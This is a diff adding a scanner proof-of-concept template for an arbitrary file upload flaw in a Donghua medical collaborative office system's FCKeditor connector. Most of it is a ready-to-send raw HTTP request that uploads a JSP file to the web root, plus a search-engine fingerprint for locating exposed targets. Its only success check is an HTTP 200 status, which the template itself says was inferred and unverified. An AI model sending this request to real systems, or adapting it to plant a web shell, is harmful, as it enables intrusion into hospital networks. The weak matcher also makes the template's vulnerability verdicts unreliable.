@@ -1,0 +1,50 @@
+id: poc-b5feaa82d9b3760b6b91
+info:
+  name: 东华医疗协同办公系统connector接口处存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b5feaa82d9b3760b6b91c70c82fb66a6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b5feaa82d9b3760b6b91c70c82fb66a6
+    fofa: + Hunter`web.body="/skin/charmBlue/css/dialog.css"`
+http:
+- raw:
+  - 'POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+
+    Connection: close
+
+    Content-Length: 292
+
+
+    ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+
+    Content-Disposition: form-data; name="NewFile"; filename="stc.jsp"
+
+    Content-Type: image/jpeg
+
+
+    123good
+
+    ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    upload
+
+    ------WebKitFormBoundaryt1qdEWTI01cj5BLV--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
